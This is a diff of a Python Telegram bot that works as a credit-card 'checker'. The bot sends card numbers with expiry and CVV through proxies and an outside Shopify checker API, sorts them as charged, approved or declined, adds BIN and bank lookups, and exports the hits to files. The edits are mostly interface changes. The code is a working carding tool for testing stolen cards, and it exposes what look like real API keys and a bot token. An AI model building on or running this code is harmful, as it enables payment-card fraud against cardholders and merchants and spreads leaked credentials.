@@ -13,7 +13,7 @@ API_ID = 33552520
 API_HASH = 'd82affa92dd5a1dbaa3087aa19a732f2'
 BOT_TOKEN = '8989181458:AAEcCemFHqEWevwdb_djS46PCX-1Saa0h-g'
 ADMIN_ID = [7132150988]
-CHECKER_API_URL = 'https://afuonaa.up.railway.app/shopify'
+CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -49,7 +49,6 @@ PREMIUM_EMOJI_IDS = {
     "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
     "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
     "📍": "5447187153274567373", "🔐": "5258476306152038031",
-    "🛑": "5275969776668134187",
 }
 
 def premium_emoji(text: str) -> str:
@@ -62,12 +61,12 @@ def premium_emoji(text: str) -> str:
 
 def get_main_menu_keyboard(user_id=None):
     buttons = [
-        [Button.inline("⚡ Cmd", b"show_cmds"),
-         Button.url("📢 Channel", "https://t.me/dududadadee")]
+        [Button.inline(" Cmd", b"show_cmds", style="success"),
+         Button.url(" Channel", "https://t.me/dududadadee", style="success")]
     ]
     
     if user_id and user_id in ADMIN_ID:
-        buttons.append([Button.inline("👑 Admin Panel", b"admin_panel")])
+        buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="success")])
     
     return buttons
 
@@ -84,28 +83,19 @@ def get_file_lines(filepath):
 
 def load_premium_users():
     if not os.path.exists(PREMIUM_USERS_FILE):
-        users = [str(admin) for admin in ADMIN_ID]
         with open(PREMIUM_USERS_FILE, 'w') as f:
-            for uid in users:
-                f.write(f"{uid}\n")
-        return users
+            for admin in ADMIN_ID:
+                f.write(f"{admin}\n")
+        return [str(admin) for admin in ADMIN_ID]
     try:
         with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             users = [line.strip() for line in f if line.strip()]
-        
-        # Ensure all admins are in the list
-        updated = False
         for admin in ADMIN_ID:
             if str(admin) not in users:
                 users.append(str(admin))
-                updated = True
-        
-        # Single file write if any admin was missing
-        if updated:
-            with open(PREMIUM_USERS_FILE, 'w') as f:
-                for uid in users:
-                    f.write(f"{uid}\n")
-        
+                with open(PREMIUM_USERS_FILE, 'w') as f:
+                    for u in users:
+                        f.write(f"{u}\n")
         return users
     except Exception as e:
         print(f"Error loading premium users: {e}")
@@ -142,7 +132,6 @@ async def remove_premium_user(user_id):
     return False
 
 def is_site_dead(response_msg, gateway, price):
-    """For card checking - determines if site is dead based on response"""
     if not response_msg:
         return True
     
@@ -154,14 +143,6 @@ def is_site_dead(response_msg, gateway, price):
         return True
     
     return False
-
-def is_site_test_alive(response_msg, gateway):
-    """For site testing only - site is alive if it gives a valid response with gateway"""
-    if not response_msg:
-        return False
-    if not gateway or gateway == "Unknown":
-        return False
-    return True
 
 async def get_bin_info(card_number):
     try:
@@ -297,7 +278,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
 
 async def send_realtime_hit(user_id, result, hit_type, username):
     emoji = "✅" if hit_type == "Charged" else "🔥"
-    status_text = "💎 CHARGED" if hit_type == "Charged" else "🔥 APPROVED"
+    status_text = "CHARGED" if hit_type == "Charged" else "APPROVED"
 
     brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
 
@@ -325,18 +306,18 @@ async def update_progress(user_id, message_id, results, current_attempt_count):
     minutes = (elapsed % 3600) // 60
     seconds = elapsed % 60
 
-    progress_text = f"""⏱️ Elapsed: {hours:02d}:{minutes:02d}:{seconds:02d}
+    progress_text = f""" 💳  Card: <code>{results.get('last_card', 'None')}</code>
     
-💳 Card: <code>{results.get('last_card', 'None')}</code>
 💰 {results.get('last_price', '-')}
+    
 📝 {results.get('last_response', 'Waiting...')[:30]}
-📊 Checked: {current_attempt_count}/{results['total']}"""
+    """
 
     buttons = [
-        [Button.inline(f"✅ CHARGED {len(results['charged'])}", b"none")],
-        [Button.inline(f"🔥 APPROVED {len(results['approved'])}", b"none")],
-        [Button.inline(f"❌ DECLINED {len(results['dead'])}", b"none")],
-        [Button.inline(f"🛑 STOP", f"stop_{user_id}".encode())]
+        [Button.inline(f" CHARGED {len(results['charged'])}", b"none", style="success")],
+        [Button.inline(f" APPROVED {len(results['approved'])}", b"none", style="primary")],
+        [Button.inline(f" DECLINED {len(results['dead'])}", b"none", style="danger")],
+        [Button.inline(" STOP", f"stop_{user_id}".encode(), style="danger")]
     ]
 
     try:
@@ -353,10 +334,10 @@ async def send_final_results(user_id, results):
     hits_text = ""
     if results['charged']:
         for r in results['charged'][:5]:
-            hits_text += f"💎 <code>{r['card']}</code>\n"
+            hits_text += f" <code>{r['card']}</code>\n"
     if results['approved']:
         for r in results['approved'][:5]:
-            hits_text += f"🔥 <code>{r['card']}</code>\n"
+            hits_text += f" <code>{r['card']}</code>\n"
 
     if not hits_text:
         hits_text = "No hits found"
@@ -365,37 +346,34 @@ async def send_final_results(user_id, results):
 
     summary = f"""✅ Check Complete! ✅
 
-⏱️ Time: {hours:02d}:{minutes:02d}:{seconds:02d}
-
 📊 Results:
-   ┣ 💎 Charged: {len(results['charged'])}
+   ┣ ✅ Charged: {len(results['charged'])}
    ┣ 🔥 Approved: {len(results['approved'])}
    ┣ ❌ Declined: {len(results['dead'])}
    ┗ 📊 Total: {results['total']}
 
-🎯 Hits:
+Hits:
 {hits_text}
-💡 Made by meow meow"""
+
+💡 Made by MEOW MEOW"""
 
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"afuonax{timestamp}.txt"
 
     async with aiofiles.open(filename, 'w') as f:
-        await f.write("=== CC CHECKER RESULTS ===\n")
-        await f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        await f.write(f"Total: {results['total']} | Charged: {len(results['charged'])} | Approved: {len(results['approved'])} | Declined: {len(results['dead'])}\n\n")
+        await f.write("CC CHECKER RESULTS\n")
         
-        await f.write(f"=== CHARGED ({len(results['charged'])}) ===\n")
+        await f.write(f"CHARGED ({len(results['charged'])}):\n")
         for r in results['charged']:
             await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
         await f.write("\n")
         
-        await f.write(f"=== APPROVED ({len(results['approved'])}) ===\n")
+        await f.write(f"APPROVED ({len(results['approved'])}):\n")
         for r in results['approved']:
             await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
         await f.write("\n")
         
-        await f.write(f"=== DECLINED ({len(results['dead'])}) ===\n")
+        await f.write(f"DECLINED ({len(results['dead'])}):\n")
         for r in results['dead']:
             await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
 
@@ -408,7 +386,6 @@ async def send_final_results(user_id, results):
 
 
 async def test_site(site, proxy):
-    """Test if a site is alive using a test card. Only checks if gateway responds."""
     test_card = "4031630422575208|01|2030|280"
     try:
         if not site.startswith('http'):
@@ -440,12 +417,12 @@ async def test_site(site, proxy):
         
         response_msg = raw.get('Response', '')
         gateway = raw.get('Gateway', '')
+        price = raw.get('Price', '-')
         
-        # For site testing, we only check if gateway responds (ignore price)
-        if is_site_test_alive(response_msg, gateway):
-            return {'site': site, 'status': 'alive'}
-        else:
+        if is_site_dead(response_msg, gateway, price):
             return {'site': site, 'status': 'dead'}
+        else:
+            return {'site': site, 'status': 'alive'}
     except:
         return {'site': site, 'status': 'dead'}
 
@@ -489,7 +466,7 @@ async def start(event):
    🦉 Add sites: <code>/site</code>
    🦉 Check CC: <code>/cc card|mm|yy|cvv</code>
 
-💡 Made by meow meow"""
+💡 Made by MEOW MEOW"""
     
     buttons = get_main_menu_keyboard(user_id)
     
@@ -516,7 +493,7 @@ async def show_commands_callback(event):
 ├─ <code>/clearproxy</code> → Remove all proxies
 └─ <code>/getproxy</code> → Get all proxies"""
     
-    buttons = [[Button.inline("🔙 Back", b"main_menu")]]
+    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
     
     await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')
     
@@ -541,8 +518,8 @@ async def admin_panel_callback(event):
 
 📊 <b>Bot Statistics</b>
 └─ <code>/stats</code> → Show bot statistics"""
-    
-    buttons = [[Button.inline("🔙 Back", b"main_menu")]]
+
+    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
     
     await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')
     
@@ -564,7 +541,7 @@ async def main_menu_callback(event):
    ➥ Add sites: <code>/site</code>
    ➥ Check CC: <code>/cc card|mm|yy|cvv</code>
 
-💡 Made by meow meow"""
+💡 Made by MEOW MEOW"""
     
     buttons = get_main_menu_keyboard(user_id)
     
@@ -629,7 +606,7 @@ async def single_cc_check(event):
 🏦 Bank {bank}
 🥰 Country {country} {flag}
 
-💡 Made by meow meow"""
+💡 Made by MEOW MEOW"""
 
         await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
 
@@ -1112,42 +1089,7 @@ async def remove_site_command(event):
 
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
-
         
-# ==================== /getsites - NEW HANDLER ====================
-@bot.on(events.NewMessage(pattern='/getsites'))
-async def get_sites_command(event):
-    user_id = event.sender_id
-    
-    if user_id not in ADMIN_ID:
-        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
-        return
-    
-    sites = load_sites()
-    
-    if not sites:
-        await event.reply(premium_emoji("❌ No sites in sites.txt"), parse_mode='html')
-        return
-    
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"sites_{timestamp}.txt"
-    
-    async with aiofiles.open(filename, 'w') as f:
-        for site in sites:
-            await f.write(f"{site}\n")
-    
-    await event.reply(
-        premium_emoji(f"📋 Sites List ({len(sites)} sites)"),
-        file=filename,
-        parse_mode='html'
-    )
-    
-    try:
-        os.remove(filename)
-    except:
-        pass
-# ==================== END /getsites ====================
-
         
 @bot.on(events.NewMessage(pattern='/addsites'))
 async def add_sites_command(event):
@@ -1222,7 +1164,7 @@ async def add_sites_command(event):
         
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
-
+        
         
 @bot.on(events.NewMessage(pattern='/addpremium'))
 async def add_premium_command(event):
@@ -1337,7 +1279,7 @@ async def stop_handler(event):
     session_key = f"{user_id}_{message_id}"
     if session_key in active_sessions:
         del active_sessions[session_key]
-        await event.answer("🛑 Stopped", alert=True)
+        await event.answer(" Stopped", alert=True)
         await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
 
 print("✅ Bot started successfully!")
